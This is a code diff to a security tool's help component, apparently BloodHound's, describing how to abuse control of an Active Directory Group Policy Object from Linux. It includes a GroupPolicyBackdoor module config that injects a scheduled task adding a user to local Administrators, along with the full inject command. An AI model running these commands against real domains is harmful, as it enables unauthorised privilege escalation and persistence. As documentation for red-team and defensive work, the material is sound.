@@ -23,18 +23,53 @@ const LinuxAbuse: FC<EdgeInfoProps> = () => {
     return (
         <>
             <Typography variant='body2'>
-                With full control of a GPO, you may make modifications to that GPO which will then apply to the users
-                and computers affected by the GPO. Select the target object you wish to push an evil policy down to,
-                then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such
-                as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and
-                execute the new evil policy. See the references tab for a more detailed write up on this abuse.
+                If you control a GPO linked to a target object, you can modify that GPO to inject malicious
+                configuration. For example, you can add an immediate scheduled task that runs on the computers or users
+                that process the GPO, compromising those objects. Some settings, including scheduled tasks, support
+                item-level targeting, which can limit execution to specific objects. GPOs apply every 90 minutes for
+                standard objects (with a random offset of 0 to 30 minutes), and every 5 minutes for domain controllers.
             </Typography>
 
             <Typography variant='body2'>
+                The{' '}
+                <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/GroupPolicyBackdoor'>
+                    GroupPolicyBackdoor.py
+                </Link>{' '}
+                tool can perform the attack from Linux. First, define a module file that describes the configuration to
+                inject. The example below defines a computer configuration with an immediate scheduled task that adds a
+                domain user as a local administrator. The filter limits the configuration to a specific target.
+            </Typography>
+
+            <Typography component={'pre'}>
+                {'[MODULECONFIG]\n' +
+                    'name = Scheduled Tasks\n' +
+                    'type = computer\n' +
+                    '\n' +
+                    '[MODULEOPTIONS]\n' +
+                    'task_type = immediate\n' +
+                    'program = cmd.exe\n' +
+                    'arguments = /c "net localgroup Administrators corp.com\\john /add"\n' +
+                    '\n' +
+                    '[MODULEFILTERS]\n' +
+                    'filters = [{ "operator": "AND", "type": "Computer Name", "value": "srv1.corp.com"}]'}
+            </Typography>
+
+            <Typography variant='body2'>
+                Save this configuration as Scheduled_task_add.ini, then inject it into the target GPO with the 'inject'
+                command.
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
+                }
+            </Typography>
+
+            <Typography variant='body2'>
+                Alternatively,{' '}
                 <Link target='_blank' rel='noopener noreferrer' href='https://github.com/Hackndo/pyGPOAbuse'>
                     pyGPOAbuse.py
                 </Link>{' '}
-                can be used for that purpose.
+                can also be used for this purpose.
             </Typography>
         </>
     );
